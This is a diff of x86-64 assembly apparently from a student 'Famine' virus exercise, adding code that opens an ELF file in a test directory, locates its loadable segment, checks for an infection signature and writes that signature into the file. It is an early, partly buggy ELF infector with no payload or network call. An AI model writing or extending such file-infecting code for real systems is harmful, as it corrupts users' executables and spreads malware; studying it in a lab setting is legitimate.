@@ -63,30 +63,34 @@ _check_file:
     sub rsp, check_file_size
 
 	; === open file ===
+	_open_file:
 		mov	rax, SYS_OPEN
-		lea	rdi, [rel file_name]
+		mov rdi, rsi
+		; lea	rdi, [rel file_name]
 		mov rsi, O_RDWR
 		xor rdx, rdx 
 		syscall
-		cmp	rax, qword 0x0
+		cmp	rax, 0x0
 		jl	_leave_return
 		mov CHF(check_file.file_fd), rax
 
 	; === get file size ===
+	_get_filesz:
 		mov rax, SYS_LSEEK
 		mov	rdi, CHF(check_file.file_fd)
 		mov	rsi, 0x0
 		mov rdx, SEEK_END
 		syscall
-		mov r10, rax
-		mov rax, SYS_LSEEK
-		mov rdx, SEEK_SET
-		syscall
+		; mov r10, rax
+		; mov rax, SYS_LSEEK
+		; mov rdx, SEEK_SET
+		; syscall
 
 	; === mmap file ===
+	_map_file:
+		mov rsi, rax			; rsi = file_size
 		mov rax, SYS_MMAP
 		mov	rdi, 0x0
-		mov rsi, r10
 		mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
 		mov r10, MAP_SHARED
 		mov r8, CHF(check_file.file_fd)
@@ -94,27 +98,51 @@ _check_file:
 		syscall
 		cmp	rax, 0x0
 		jl _leave_return
-		mov CHF(check_file.map), rax
+		mov CHF(check_file.map), rax		; voir si necessaire
 
 	; === check file format ===
-		cmp	dword [rax + 1], 0x02464c45	; if != 'E'
+	_check_format:
+		cmp	dword [rax + 1], 0x02464c45	; if != 'ELF64'
 		jne _leave_return
 
 	; === Find text segment ===
 	_fd_txt_seg:
-		mov r14, rax
-		mov r10, elf64_ehdr.e_phoff
-		add r14, elf64_ehdr.e_phoff
+		mov r14, rax								; rax -> elf start addr
+		movzx r15, word [r14 + elf64_ehdr.e_phnum]	; r15 = number of segments
+		add r14, [r14 + elf64_ehdr.e_phoff]			; r14 -> start of segment headers's table
+		xor rcx, rcx								; loop counter
+		mov r13, r14								; r13 will point to each phdr
 		_segment_loop:
-			mov r13, r14
-			add r13, elf64_phdr.p_type
+			cmp r15w, cx
+			je	_leave_return
 			cmp word [r13], PT_LOAD
-			je _segment_loop
-			inc r14
+			je _txt_found
+			inc rcx
+			add r13, elf64_phdr_size			; r13 -> tab_phdr[rcx].p_type
 			jmp _segment_loop
 	
 	; === found text segment ===
- 
+	_txt_found:
+		add r13, [r13 + elf64_phdr.p_filesz]	; jmp to potential injection addr
+		; inc r13								; Voir si necessaire
+	; === check if infected ===
+		lea r12, signature
+		mov rax, [r12]
+		cmp rax, qword [r13]
+		je	_leave_return
+	; === Infection ===
+		push rcx
+		xor rcx, rcx
+		_strcpy_loop:
+			cmp byte [r12 + rcx], 0
+			je	_strcpy_loop_end
+			mov al, byte [r12 + rcx]
+			mov [r13 + rcx], al
+			inc rcx
+			jmp _strcpy_loop
+		_strcpy_loop_end:
+		pop rcx	
+		jmp _leave_return
 	; *** pas obligatoire ***
 	_close_file:
 		mov	rax, qword 0x3
@@ -136,4 +164,5 @@ _exit:
 
 dir1        db  "../test", 0
 open        db  "It worked", 10, 0
-file_name	db	"sample64",0x0
+file_name	db	"sample64", 0x0
+signature	db	"Famine version 1.0 (c)oded by anvincen-eedy"
